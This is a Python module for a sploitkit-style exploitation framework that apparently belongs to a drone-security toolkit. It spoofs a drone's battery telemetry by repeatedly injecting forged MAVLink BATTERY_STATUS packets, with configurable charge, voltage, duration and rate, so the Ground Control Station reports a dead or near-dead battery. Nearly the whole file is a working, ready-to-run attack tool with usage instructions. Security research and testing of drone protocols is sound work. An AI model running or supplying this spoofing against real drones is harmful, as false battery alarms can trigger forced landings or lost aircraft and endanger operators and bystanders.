from sploitkit import Config, Option
from lib.base import MAVLinkModule
from pymavlink import mavutil
import time
import sys

class BatterySpoofing(MAVLinkModule):
    """
    Spoof the drone's battery status to mislead the Ground Control Station (GCS)
    into thinking the battery is critically low or dead.

    Connection:
        Supports both network and serial connections:
        - Network: udp:10.13.0.6:14550 or tcp:10.13.0.6:5760
        - Serial: /dev/ttyUSB0 (Linux) or COM3 (Windows)

    Usage:
        set connection udp:10.13.0.6:14550
        set battery_remaining 0
        run
    """

    # Inherit connection config from base class and add module-specific options
    config = MAVLinkModule.config + Config({
        Option(
            name='battery_remaining',
            description='Remaining battery percentage (0-100)',
            required=False,
        ): "0",  # Default: 0% - dead battery
        Option(
            name='voltage',
            description='Battery voltage in millivolts (per cell)',
            required=False,
        ): "3000",  # Default: 3.0V (low for LiPo)
        Option(
            name='duration',
            description='Duration of spoofing in seconds (0 for infinite)',
            required=False,
        ): "60",  # Default value
        Option(
            name='update_rate',
            description='Battery status update rate in Hz',
            required=False,
        ): "1",  # Default: 1 Hz
    })

    def send_battery_status(self, master, battery_remaining, voltage):
        """
        Send a spoofed MAVLink BATTERY_STATUS message.
        """
        # Calculate voltages for a 3-cell battery (assuming all cells same voltage)
        voltages = [voltage, voltage, voltage, 0, 0, 0, 0, 0, 0, 0]

        master.mav.battery_status_send(
            id=0,  # Battery ID
            battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
            type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
            temperature=300,  # 30°C
            voltages=voltages,
            current_battery=-1,  # Not measured
            current_consumed=5000,  # mAh consumed
            energy_consumed=10000,  # Joules consumed
            battery_remaining=battery_remaining
        )

    def run(self):
        # Retrieve configuration options
        battery_remaining = int(self.config['battery_remaining'])
        voltage = int(self.config['voltage'])
        duration = int(self.config['duration'])
        update_rate = int(self.config['update_rate'])

        separator = "=" * 80
        self.logger.info(separator)
        self.logger.info("Battery Spoofing Attack")
        self.logger.info(separator)
        self.logger.warning("This will inject false battery status into the MAVLink stream")
        self.logger.info(f"Battery Remaining: {battery_remaining}%")
        self.logger.info(f"Cell Voltage: {voltage}mV ({voltage/1000:.2f}V)")
        self.logger.info(f"Update Rate: {update_rate} Hz")
        if duration > 0:
            self.logger.info(f"Duration: {duration} seconds")
        else:
            self.logger.info("Duration: Infinite (Ctrl+C to stop)")
        self.logger.info(separator)

        if battery_remaining == 0:
            self.logger.warning("WARNING: 0% battery will indicate complete battery failure!")

        try:
            # Connect to the MAVLink device (supports both serial and network)
            master = self.connect_drone()

            # Set spoofed system ID
            master.source_system = 1
            master.source_component = 1

            start_time = time.time()
            count = 0
            interval = 1.0 / update_rate

            # Main spoofing loop
            while True:
                # Check if the duration has been reached
                if duration > 0 and (time.time() - start_time >= duration):
                    self.logger.info(f"Spoofing duration of {duration} seconds reached. Stopping...")
                    break

                # Send spoofed battery status
                self.send_battery_status(master, battery_remaining, voltage)

                count += 1

                if count % (update_rate * 10) == 0:
                    elapsed = time.time() - start_time
                    self.logger.info(f"Sent {count} spoofed battery packets ({elapsed:.1f}s elapsed)")

                time.sleep(interval)

            self.logger.success(f"\n{separator}")
            self.logger.success(f"Battery Spoofing Completed")
            self.logger.success(f"Total packets sent: {count}")
            self.logger.success(f"{separator}")

        except KeyboardInterrupt:
            self.logger.info("\n\nAttack interrupted by user")
        except Exception as e:
            self.logger.error(f"Error during spoofing: {str(e)}")
            import traceback
            self.logger.error(traceback.format_exc())
        finally:
            # Clean up connection
            self.close_connection(master)
